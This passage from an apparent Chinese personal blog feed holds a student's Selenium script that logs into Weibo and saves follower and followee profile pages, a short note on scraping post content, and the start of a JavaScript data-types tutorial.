title="Explanation"></a>Explanation</h3><p>我在这里把帖子的获取放到了获取关注列表和粉丝列表的前面，因为这样能够减少页面的跳转。动态信息的获取和静态信息的获取有所不同。前面我们在获取个人信息的时候采取的是直接保存页面html再进行解析的方法，但是这里就不适用了，因为如果你用这种方法的话，会发现保存的html里面根本就不包含帖子的内容，这是为什么呢？因为网页除了静态元素，还有动态元素，html是静态的，但是我们所需的数据是通过网络包传输的（也就是network），所以按道理来说我们需要抓取网页的network数据包来进行分析。查了一下资料发现可以下载python库browsermobproxy进行代理来获取数据包，但是由于不熟悉使用，导致我可以获得百度的network数据包，但是在获取登录之后微博的network数据包的时候却发现是空的，不是很懂。后面发现selenium可以直接获取页面元素，静态元素和动态元素都能够获取，于是我干脆直接用selenium来搞了，关键步骤还是在于页面的跳转、句柄的转换和混乱格式的处理。<br>下面是帖子内容时间等信息的获取：<br><a href="https://imgse.com/i/xozO3R"><img src="https://s1.ax1x.com/2022/10/31/xozO3R.png" alt="xozO3R.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫项目(3)——微博社交信息获取</title>
    <link href="/2022/10/31/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(3)/"/>
    <url>/2022/10/31/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(3)/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium爬虫项目（3）——微博社交信息获取"><a href="#selenium爬虫项目（3）——微博社交信息获取" class="headerlink" title="selenium爬虫项目（3）——微博社交信息获取"></a>selenium爬虫项目（3）——微博社交信息获取</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>最近事好像又挺多，也不知道在忙啥。本来计划周末写完这个大作业的，然而昨天被抓去校运会拍了一天照，晚上回来开始写，基本上把信息获取部分都给完成了，剩下的只有信息的可视化了，这一篇先介绍微博社交信息的部分，下一篇写动态信息的获取。</p><h2 id="step1-获取关注列表和粉丝列表前十个的信息"><a href="#step1-获取关注列表和粉丝列表前十个的信息" class="headerlink" title="step1 获取关注列表和粉丝列表前十个的信息"></a>step1 获取关注列表和粉丝列表前十个的信息</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>non_bmp_map=<span class="hljs-built_in">dict</span>.fromkeys(<span class="hljs-built_in">range</span>(<span class="hljs-number">0x10000</span>,sys.maxunicode+<span class="hljs-number">1</span>),<span class="hljs-number">0xfffd</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        <span class="hljs-comment">#driver.find_element_by_xpath(&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a&#x27;).click()</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;2&quot;]/div/div[1]/h3/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click()<br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;dmCheck&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">1</span>)<br>        driver.find_element_by_id(<span class="hljs-string">&#x27;send_dm_btn&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).send_keys(<span class="hljs-string">&quot;等风&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/ul/li[2]/a&#x27;</span>).click()<br>        <span class="hljs-comment">#driver.find_element_by_xpath(&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[1]/div[2]/div/a[1]&#x27;).click()</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[2]/div[2]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a/span&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        source=driver.page_source<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;information1.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__50&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>).click() <span class="hljs-comment">#点开关注列表</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>): <span class="hljs-comment">#打开十个关注人的窗口</span><br>            driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_HisRelation__56&quot;]/div/div/div/div[2]/div[1]/ul/li[<span class="hljs-subst">&#123;i&#125;</span>]/dl/dd[1]/div[1]/a[1]&#x27;</span>).click()<br>            time.sleep(<span class="hljs-number">1</span>)<br>        guanzhu=driver.window_handles[<span class="hljs-number">1</span>:]<br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(guanzhu)):<br>            time.sleep(<span class="hljs-number">1</span>)<br>            driver.switch_to.window(guanzhu[<span class="hljs-built_in">len</span>(guanzhu)-<span class="hljs-number">1</span>-i])<br>            <span class="hljs-keyword">try</span>:<br>                time.sleep(<span class="hljs-number">3</span>)<br>                <span class="hljs-keyword">try</span>:   <span class="hljs-comment">#处理不同的格式</span><br>                    guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/strong&#x27;</span>)  <span class="hljs-comment">#关注数</span><br>                    <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                    fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/strong&#x27;</span>) <span class="hljs-comment">#粉丝数</span><br>                    <span class="hljs-built_in">print</span>(fans1.text)<br>                    blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/strong&#x27;</span>)  <span class="hljs-comment">#博文数</span><br>                    <span class="hljs-built_in">print</span>(blogs.text)<br>                <span class="hljs-keyword">except</span>:<br>                    guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                    fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(fans1.text)<br>                    blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(blogs.text)<br>                driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">3</span>)<br>                source=driver.page_source<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;关注_<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:    <span class="hljs-comment">#个人信息写入文件</span><br>                    f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>                time.sleep(<span class="hljs-number">1</span>)<br>                driver.close()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no info&quot;</span>)<br>                driver.close()<br><br>            time.sleep(<span class="hljs-number">2</span>)<br>        driver.switch_to.window(driver.window_handles[<span class="hljs-number">0</span>])<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_HisRelationNav__55&quot;]/div/div[2]/div[1]/div/div/div/div/ul/li[2]/a&#x27;</span>).click()  <span class="hljs-comment">#打开粉丝列表</span><br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):  <span class="hljs-comment">#点开十个粉丝的窗口</span><br>            driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_HisRelation__56&quot;]/div/div/div/div[2]/div[1]/ul/li[<span class="hljs-subst">&#123;i&#125;</span>]/dl/dd[1]/div[1]/a[1]&#x27;</span>).click()<br>            time.sleep(<span class="hljs-number">1</span>)<br>        fans=driver.window_handles[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fans)):<br>            time.sleep(<span class="hljs-number">1</span>)<br>            driver.switch_to.window(fans[<span class="hljs-built_in">len</span>(fans)-<span class="hljs-number">1</span>-i])<br>            <span class="hljs-keyword">try</span>:   <span class="hljs-comment">#处理不同的格式</span><br>                time.sleep(<span class="hljs-number">3</span>)<br>                guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>)  <span class="hljs-comment">#关注数</span><br>                <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/a/strong&#x27;</span>)  <span class="hljs-comment">#粉丝数</span><br>                <span class="hljs-built_in">print</span>(fans1.text)<br>                blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/a/strong&#x27;</span>) <span class="hljs-comment">#博文数</span><br>                <span class="hljs-built_in">print</span>(blogs.text)<br>                driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">3</span>)<br>                source=driver.page_source<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;粉丝_<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment">#个人信息写入文件</span><br>                    f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>                time.sleep(<span class="hljs-number">1</span>)<br>                driver.close()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no info&quot;</span>)<br>                driver.close()<br><br>            time.sleep(<span class="hljs-number">2</span>)<br>        <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><p>这一步总体来说需要注意很多地方，首先是窗口句柄的转换，需要进入不同用户的主页进行信息采集，这一步需要将当前窗口句柄设置好；其次对于不同类型的用户，官方账号和普通用户，它们主页的格式有所不同，需要同时对这两种类型的用户考虑，此外还有关注人数、粉丝数是否大于10的判断，这里我们为了简便，直接采用try-except语句处理。</p><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>由于时间原因，而且上面的过程基本上也都是体力活（界面的跳转和格式的混乱确实烦人），所以不作过多解释，将代码调通，能获取到关注列表和粉丝列表的关注数、点赞数、博文数和个人信息即可。<br>下面是获取到的关注数、点赞数、博文数（个人信息已写入文件）：<br><a href="https://imgse.com/i/xoLEwj"><img src="https://s1.ax1x.com/2022/10/31/xoLEwj.png" alt="xoLEwj.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Javascript初步</title>
    <link href="/2022/10/11/Javascript%E5%88%9D%E6%AD%A5/"/>
    <url>/2022/10/11/Javascript%E5%88%9D%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Javascript初步"><a href="#Javascript初步" class="headerlink" title="Javascript初步"></a>Javascript初步</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>最近了解了一种新的漏洞——原型链污染。了解到原型链污染是一个关于前端js的相关漏洞，OK，那就先来学一下Javascript的基础嘛，后面学完原型链污染再写另一篇。其实Javascript包括另外两大前端语言HTML,CSS在当时开发学院文化节活动网站的时候也接触过（虽然主要负责后端的工作），并且Javascript在某种程度上和C语言很像，所以这一篇内容不会特别详尽。</p><h2 id="Javascript数据类型"><a href="#Javascript数据类型" class="headerlink" title="Javascript数据类型"></a>Javascript数据类型</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>Javascript的字符串声明和Python差不多，可以使用单引号或者双引号，如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> string1=<span class="hljs-string">&quot;Hello World!&quot;</span>;<br><span class="hljs-keyword">var</span> string2=<span class="hljs-string">&quot;Hello Javascript!&quot;</span>;<br><span class="hljs-built_in">console</span>.log(string1);<br><span class="hljs-built_in">console</span>.log(string2);<br></code></pre></td></tr></table></figure></p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>Javascript只有一种数字类型，可以带或不带小数点，如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> num1=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">var</span> num2=<span class="hljs-number">1.00</span>;<br><span class="hljs-built_in">console</span>.log(num1);<br><span class="hljs-built_in">console</span>.log(num2);<br></code></pre></td></tr></table></figure></p><h3 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h3><p>布尔类型只能有两个值，true或者false，如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> bool1=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">var</span> bool2=<span class="hljs-literal">false</span>;<br><span class="hljs-built_in">console</span>.log(bool1);<br><span class="hljs-built_in">console</span>.log(bool2);<br></code></pre></td></tr></table></figure></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="数组的声明"><a href="#数组的声明" class="headerlink" title="数组的声明"></a>数组的声明</h4><p>Javascript数组中可以存放任意类型的数据。Javascript声明数组的方法有很多，下面的方法都可以声明（本人更倾向于类似python的声明方法，因为简单哈哈哈），如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>array1[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">var</span> array2=[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">console</span>.log(array1[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">console</span>.log(array2[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure></p><h4 id="数组元素的插入"><a href="#数组元素的插入" class="headerlink" title="数组元素的插入"></a>数组元素的插入</h4><p>Javascript数组的插入使用push函数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>array1.push(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">console</span>.log(array1)<br></code></pre></td></tr></table></figure><br>或者直接给数组元素赋值：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>array1[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>;<br><span class="hljs-built_in">console</span>.log(array1)<br></code></pre></td></tr></table></figure></p><h4 id="数组元素的删除"><a href="#数组元素的删除" class="headerlink" title="数组元素的删除"></a>数组元素的删除</h4><p>删除最后一项使用pop函数：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>array1.pop();<br><span class="hljs-built_in">console</span>.log(array1)<br></code></pre></td></tr></table></figure><br>或者修改数组长度：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>array1.length=<span class="hljs-number">2</span>;<br><span class="hljs-built_in">console</span>.log(array1)<br></code></pre></td></tr></table></figure><br>删除任意位置使用splice函数，如下代码表示删除第一项索引为0，删除一项：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> array1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>array1.splice(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-built_in">console</span>.log(array1)<br></code></pre></td></tr></table></figure></p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>Javascript对象由键值对构成，属性由逗号隔开：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;等风&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">19</span>&#125;;<br><span class="hljs-built_in">console</span>.log(object)<br></code></pre></td></tr></table></figure><br>也可以这样声明：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object=&#123;&#125;;<br>object.name=<span class="hljs-string">&quot;等风&quot;</span>;<br>object.age=<span class="hljs-number">19</span>;<br><span class="hljs-built_in">console</span>.log(object)<br></code></pre></td></tr></table></figure><br>对象的寻址：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;等风&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">19</span>&#125;;<br><span class="hljs-built_in">console</span>.log(object.name)<br><span class="hljs-built_in">console</span>.log(object)<br></code></pre></td></tr></table></figure><br>或者<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;等风&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">19</span>&#125;;<br><span class="hljs-built_in">console</span>.log(object[<span class="hljs-string">&#x27;name&#x27;</span>])<br><span class="hljs-built_in">console</span>.log(object)<br></code></pre></td></tr></table></figure></p><h3 id="Undefined和Null"><a href="#Undefined和Null" class="headerlink" title="Undefined和Null"></a>Undefined和Null</h3><p>Undefined表示变量没有初始值（变量存在但无值）<br>值得注意的是，在javascript中undefined和null在”==”比较运算符下是一样的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a=<span class="hljs-literal">undefined</span>;<br><span class="hljs-keyword">var</span> b=<span 